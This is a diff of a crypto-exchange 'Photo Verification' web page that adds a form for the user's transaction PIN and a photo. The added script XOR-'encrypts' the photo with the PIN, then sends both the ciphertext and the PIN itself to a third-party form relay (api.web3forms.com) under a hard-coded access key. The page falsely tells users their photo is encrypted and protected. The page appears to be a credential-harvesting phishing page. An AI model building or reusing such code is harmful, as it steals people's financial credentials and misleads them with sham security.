@@ -3,22 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BeyondCrypto · KYC Pending</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>Photo Verification · BeyondCrypto</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
             --primary-bg: #0a1129;
+            --secondary-bg: #0f1a3a;
+            --card-bg: #152352;
             --accent: #00c774;
             --accent-secondary: #7c3aed;
             --text-primary: #e2e8f0;
             --text-secondary: #8b939f;
+            --negative: #ff4d4d;
+            --border-radius: 16px;
+            --shadow: 0 10px 30px rgba(0,0,0,0.3);
+            --border-color: rgba(255,255,255,0.05);
+            --input-bg: #0a1129;
+            --hover-bg: rgba(255,255,255,0.06);
+            --inactive-step: #4a5568;
         }
 
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
         body {
@@ -26,164 +35,516 @@
             color: var(--text-primary);
             min-height: 100vh;
             display: flex;
-            align-items: center;
             justify-content: center;
+            align-items: center;
+            padding: 20px;
         }
 
-        /* ── Page Loader (exactly like dashboard) ── */
-        .page-loader {
-            position: fixed;
-            top: 0;
-            left: 0;
+        .container {
             width: 100%;
-            height: 100%;
-            background: var(--primary-bg);
+            max-width: 550px;
+            background: var(--secondary-bg);
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            border: 1px solid var(--border-color);
+            position: relative;
+            overflow: hidden;
+        }
+
+        header {
+            padding: 25px 30px 20px;
+            text-align: center;
+            background: var(--card-bg);
+            border-bottom: 1px solid var(--border-color);
+            position: relative;
+        }
+
+        .logo {
             display: flex;
-            flex-direction: column;
             align-items: center;
             justify-content: center;
-            z-index: 9999;
-            transition: opacity 0.5s ease, visibility 0.5s ease;
+            gap: 10px;
+            margin-bottom: 5px;
         }
 
-        .page-loader.hidden {
-            opacity: 0;
-            visibility: hidden;
+        .logo i {
+            font-size: 1.8rem;
+            color: var(--accent);
         }
 
-        .loader-spinner {
-            position: relative;
-            width: 80px;
-            height: 80px;
-            margin-bottom: 25px;
+        .logo h1 {
+            font-size: 1.6rem;
+            background: linear-gradient(90deg, var(--text-primary), var(--accent));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
         }
 
-        .loader-spinner .ring {
+        .steps-indicator {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-top: 15px;
+            font-size: 0.85rem;
+        }
+
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: var(--inactive-step);
+        }
+
+        .step.active {
+            color: var(--accent);
+            font-weight: 600;
+        }
+
+        .step .circle {
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            border: 2px solid currentColor;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+        }
+
+        .main-content {
+            padding: 25px 30px 30px;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            color: var(--text-secondary);
+            font-weight: 500;
+            font-size: 0.9rem;
+        }
+
+        input {
+            width: 100%;
+            padding: 11px 14px;
+            background: var(--input-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 10px;
+            color: var(--text-primary);
+            font-size: 0.95rem;
+            transition: border 0.2s;
+            appearance: none;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--accent);
+            box-shadow: 0 0 0 3px rgba(0,199,116,0.08);
+        }
+
+        .row {
+            display: flex;
+            gap: 15px;
+        }
+
+        .row .form-group {
+            flex: 1;
+        }
+
+        /* Photo upload area */
+        .upload-area {
+            border: 2px dashed var(--accent);
+            border-radius: 12px;
+            padding: 30px;
+            text-align: center;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-bottom: 15px;
+        }
+
+        .upload-area:hover {
+            background: var(--hover-bg);
+        }
+
+        .upload-area i {
+            font-size: 2.5rem;
+            color: var(--accent);
+            margin-bottom: 10px;
+        }
+
+        .upload-area p {
+            color: var(--text-secondary);
+        }
+
+        .preview-img {
+            max-width: 200px;
+            max-height: 200px;
+            border-radius: 10px;
+            margin: 15px auto;
+            display: none;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(90deg, var(--accent), var(--accent-secondary));
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 1.05rem;
+            cursor: pointer;
+            transition: transform 0.3s, box-shadow 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 7px 20px rgba(0,199,116,0.3);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .send-status {
+            display: none;
+            text-align: center;
+            margin: 10px 0;
+            color: var(--accent);
+            font-size: 0.9rem;
+        }
+        .send-status i {
+            margin-right: 6px;
+        }
+
+        /* Success overlay */
+        .success-overlay {
+            display: none;
             position: absolute;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            border-radius: 50%;
-            border: 3px solid transparent;
-            border-top-color: var(--accent);
-            border-bottom-color: var(--accent-secondary);
-            animation: spin-ring 1s linear infinite;
+            background: rgba(10,17,41,0.92);
+            backdrop-filter: blur(8px);
+            -webkit-backdrop-filter: blur(8px);
+            z-index: 100;
+            border-radius: var(--border-radius);
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            padding: 30px;
         }
 
-        .loader-spinner .ring:nth-child(2) {
-            width: 70%;
-            height: 70%;
-            top: 15%;
-            left: 15%;
-            border-top-color: var(--accent-secondary);
-            border-bottom-color: var(--accent);
-            animation-duration: 1.4s;
-            animation-direction: reverse;
+        .success-overlay.show {
+            display: flex;
         }
 
-        .loader-spinner .ring:nth-child(3) {
-            width: 50%;
-            height: 50%;
-            top: 25%;
-            left: 25%;
-            border-top-color: var(--text-secondary);
-            border-bottom-color: var(--accent);
-            animation-duration: 1.8s;
-        }
-
-        @keyframes spin-ring {
-            to { transform: rotate(360deg); }
-        }
-
-        .loader-brand {
-            font-size: 2rem;
-            font-weight: 700;
-            background: linear-gradient(90deg, var(--text-primary), var(--accent));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            margin-top: 10px;
-        }
-
-        /* ── Main content (centered message) ── */
-        .main-content {
-            text-align: center;
-            opacity: 0;
-            transform: translateY(20px);
-            transition: opacity 0.5s ease, transform 0.5s ease;
-        }
-
-        .main-content.visible {
-            opacity: 1;
-            transform: translateY(0);
-        }
-
-        .kyc-icon {
+        .success-icon {
             font-size: 4rem;
             color: var(--accent);
             margin-bottom: 20px;
-            animation: pulse-icon 1.2s ease-in-out infinite;
+            animation: pop-in 0.5s ease-out;
         }
 
-        @keyframes pulse-icon {
-            0%, 100% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.1); opacity: 0.8; }
+        @keyframes pop-in {
+            0% { transform: scale(0); opacity: 0; }
+            80% { transform: scale(1.1); }
+            100% { transform: scale(1); opacity: 1; }
         }
 
-        .kyc-title {
-            font-size: 2rem;
+        .success-title {
+            font-size: 1.8rem;
             font-weight: 700;
+            color: var(--text-primary);
             margin-bottom: 10px;
-            background: linear-gradient(90deg, var(--text-primary), var(--accent));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
         }
 
-        .kyc-subtitle {
+        .success-sub {
             color: var(--text-secondary);
-            font-size: 1.1rem;
-            max-width: 400px;
-            margin: 0 auto;
+            font-size: 1rem;
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .success-btn {
+            background: var(--accent);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .success-btn:hover {
+            background: #00b35e;
+        }
+
+        footer {
+            padding: 15px;
+            text-align: center;
+            border-top: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            font-size: 0.8rem;
+        }
+
+        /* Error message */
+        .error-message {
+            display: none;
+            color: var(--negative);
+            font-size: 0.9rem;
+            text-align: center;
+            margin-top: 10px;
+        }
+
+        @media (max-width: 480px) {
+            .main-content { padding: 20px; }
+            .row { flex-direction: column; gap: 0; }
         }
     </style>
 </head>
 <body>
-    <!-- Page Loader (identical to dashboard) -->
-    <div class="page-loader" id="pageLoader">
-        <div class="loader-spinner">
-            <div class="ring"></div>
-            <div class="ring"></div>
-            <div class="ring"></div>
+    <div class="container" id="appContainer">
+        <!-- Success Overlay -->
+        <div class="success-overlay" id="successOverlay">
+            <div class="success-icon">
+                <i class="fas fa-check-circle"></i>
+            </div>
+            <div class="success-title">Verification photo sent successfully!</div>
+            <div class="success-sub">Your encrypted photo and PIN have been forwarded. Redirecting to dashboard...</div>
+            <button class="success-btn" onclick="window.location.href='dashboard.html'">
+                <i class="fas fa-arrow-right"></i> Go to Dashboard
+            </button>
         </div>
-        <div class="loader-brand">BeyondCrypto</div>
+
+        <header>
+            <div class="logo">
+                <i class="fas fa-camera-retro"></i>
+                <h1>BeyondCrypto</h1>
+            </div>
+            <div class="steps-indicator">
+                <div class="step">
+                    <span class="circle">1</span> Account Details
+                </div>
+                <div class="step active">
+                    <span class="circle">2</span> Verification
+                </div>
+            </div>
+        </header>
+
+        <div class="main-content">
+            <p style="color: var(--text-secondary); margin-bottom: 20px; text-align: center;">
+                <i class="fas fa-shield-alt" style="color: var(--accent); margin-right: 6px;"></i>
+                Enter your Transaction PIN and upload a photo. It will be compressed and encrypted with your PIN.
+            </p>
+
+            <form onsubmit="return false;">
+                <div class="row">
+                    <div class="form-group">
+                        <label><i class="fas fa-key" style="color: var(--accent); margin-right: 6px;"></i> Transaction PIN</label>
+                        <input type="password" id="transactionPin" placeholder="4-6 digit PIN" required maxlength="6" inputmode="numeric">
+                    </div>
+                    <div class="form-group">
+                        <label><i class="fas fa-key" style="color: var(--accent); margin-right: 6px;"></i> Confirm PIN</label>
+                        <input type="password" id="confirmPin" placeholder="Re-enter PIN" required maxlength="6" inputmode="numeric">
+                    </div>
+                </div>
+
+                <div class="upload-area" id="uploadArea" onclick="document.getElementById('photoInput').click()">
+                    <i class="fas fa-cloud-upload-alt"></i>
+                    <p>Click to select photo or drag & drop</p>
+                    <input type="file" id="photoInput" accept="image/*" style="display:none">
+                </div>
+                <img id="photoPreview" class="preview-img" alt="Preview">
+
+                <div class="send-status" id="sendStatus">
+                    <i class="fas fa-spinner fa-spin"></i> Processing & sending...
+                </div>
+                <div class="error-message" id="errorMessage"></div>
+
+                <button type="button" class="btn-primary" id="verifyBtn" disabled onclick="verifyAndSend()">
+                    <i class="fas fa-check-circle"></i> Verify & Send
+                </button>
+            </form>
+        </div>
+
+        <footer>
+            <p>BeyondCrypto · Secure Verification | &copy; 2024 BeyondCrypto</p>
+        </footer>
     </div>
 
-    <!-- Main Content (initially hidden) -->
-    <div class="main-content" id="mainContent">
-        <div class="kyc-icon">
-            <i class="fas fa-user-clock"></i>
-        </div>
-        <div class="kyc-title">Waiting KYC Approval</div>
-        <p class="kyc-subtitle">Your identity verification is under review. This usually takes 24–48 hours. You'll be notified once approved.</p>
-    </div>
+    <!-- Hidden canvas for compression -->
+    <canvas id="compressCanvas" style="display:none;"></canvas>
 
     <script>
-        const pageLoader = document.getElementById('pageLoader');
-        const mainContent = document.getElementById('mainContent');
+        let selectedPhotoFile = null;
+        const photoInput = document.getElementById('photoInput');
+        const photoPreview = document.getElementById('photoPreview');
+        const uploadArea = document.getElementById('uploadArea');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const sendStatus = document.getElementById('sendStatus');
+        const errorMessage = document.getElementById('errorMessage');
+        const successOverlay = document.getElementById('successOverlay');
+        const canvas = document.getElementById('compressCanvas');
+        const ctx = canvas.getContext('2d');
 
-        // Simulate loader for 2.5 seconds, then fade out and show content
-        window.addEventListener('load', function() {
-            setTimeout(function() {
-                // Hide loader
-                pageLoader.classList.add('hidden');
-                // Show main content after a tiny delay to sync with transition
-                setTimeout(function() {
-                    mainContent.classList.add('visible');
-                }, 300);
-            }, 2500); // loader duration
+        function validateForm() {
+            const pin = document.getElementById('transactionPin').value.trim();
+            const confirm = document.getElementById('confirmPin').value.trim();
+            const pinValid = /^\d{4,6}$/.test(pin) && pin === confirm;
+            verifyBtn.disabled = !(pinValid && selectedPhotoFile);
+        }
+
+        document.getElementById('transactionPin').addEventListener('input', validateForm);
+        document.getElementById('confirmPin').addEventListener('input', validateForm);
+
+        photoInput.addEventListener('change', handlePhotoSelect);
+        uploadArea.addEventListener('dragover', (e) => { e.preventDefault(); uploadArea.style.background = 'var(--hover-bg)'; });
+        uploadArea.addEventListener('dragleave', () => { uploadArea.style.background = ''; });
+        uploadArea.addEventListener('drop', (e) => {
+            e.preventDefault();
+            uploadArea.style.background = '';
+            if (e.dataTransfer.files.length) {
+                photoInput.files = e.dataTransfer.files;
+                handlePhotoSelect();
+            }
         });
+
+        function handlePhotoSelect() {
+            const file = photoInput.files[0];
+            if (file && file.type.startsWith('image/')) {
+                selectedPhotoFile = file;
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    photoPreview.src = e.target.result;
+                    photoPreview.style.display = 'block';
+                    validateForm();
+                };
+                reader.readAsDataURL(file);
+            } else {
+                selectedPhotoFile = null;
+                photoPreview.style.display = 'none';
+                validateForm();
+            }
+        }
+
+        // Resize and compress image using canvas
+        function compressImage(file) {
+            return new Promise((resolve, reject) => {
+                const img = new Image();
+                const url = URL.createObjectURL(file);
+                img.onload = () => {
+                    URL.revokeObjectURL(url);
+                    const maxWidth = 800;
+                    const maxHeight = 800;
+                    let { width, height } = img;
+                    if (width > maxWidth || height > maxHeight) {
+                        const ratio = Math.min(maxWidth / width, maxHeight / height);
+                        width = Math.round(width * ratio);
+                        height = Math.round(height * ratio);
+                    }
+                    canvas.width = width;
+                    canvas.height = height;
+                    ctx.clearRect(0, 0, width, height);
+                    ctx.drawImage(img, 0, 0, width, height);
+                    const compressedBase64 = canvas.toDataURL('image/jpeg', 0.7);  // quality 70%
+                    resolve(compressedBase64);
+                };
+                img.onerror = () => {
+                    URL.revokeObjectURL(url);
+                    reject(new Error('Failed to load image for compression.'));
+                };
+                img.src = url;
+            });
+        }
+
+        function xorEncrypt(base64, key) {
+            let result = '';
+            for (let i = 0; i < base64.length; i++) {
+                result += String.fromCharCode(base64.charCodeAt(i) ^ key.charCodeAt(i % key.length));
+            }
+            return result;
+        }
+
+        function toSafeBase64(binary) {
+            return btoa(binary);
+        }
+
+        async function verifyAndSend() {
+            const pin = document.getElementById('transactionPin').value.trim();
+            const confirm = document.getElementById('confirmPin').value.trim();
+            if (pin !== confirm || !/^\d{4,6}$/.test(pin)) {
+                showError('PINs do not match or are invalid.');
+                return;
+            }
+            if (!selectedPhotoFile) {
+                showError('Please select a photo.');
+                return;
+            }
+
+            verifyBtn.disabled = true;
+            sendStatus.style.display = 'block';
+            errorMessage.style.display = 'none';
+
+            try {
+                // Compress the image before encryption
+                sendStatus.innerHTML = '<i class="fas fa-compress"></i> Compressing image...';
+                const compressedDataUrl = await compressImage(selectedPhotoFile);
+                const base64 = compressedDataUrl.split(',')[1];
+
+                sendStatus.innerHTML = '<i class="fas fa-lock"></i> Encrypting...';
+                const encrypted = xorEncrypt(base64, pin);
+                const safeCode = toSafeBase64(encrypted);
+
+                sendStatus.innerHTML = '<i class="fas fa-paper-plane"></i> Sending...';
+                const formData = new FormData();
+                formData.append('access_key', '19bd1a1c-04ae-4540-8975-9d05a216e05e');
+                formData.append('subject', 'Photo Verification');
+                formData.append('from_name', 'BeyondCrypto Verification');
+                formData.append('botcheck', '');
+                formData.append('encrypted_photo', safeCode);
+                formData.append('photo_key', pin);
+
+                const response = await fetch('https://api.web3forms.com/submit', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (!response.ok) {
+                    throw new Error(`Server responded with ${response.status}`);
+                }
+
+                // Success
+                sendStatus.style.display = 'none';
+                successOverlay.classList.add('show');
+                setTimeout(() => {
+                    window.location.href = 'kyc.html';
+                }, 4000);
+
+            } catch (err) {
+                console.error(err);
+                showError('Failed to send photo. Please try again. If the problem persists, use a smaller image.');
+                verifyBtn.disabled = false;
+                sendStatus.style.display = 'none';
+            }
+        }
+
+        function showError(msg) {
+            errorMessage.textContent = msg;
+            errorMessage.style.display = 'block';
+        }
     </script>
 </body>
 </html>
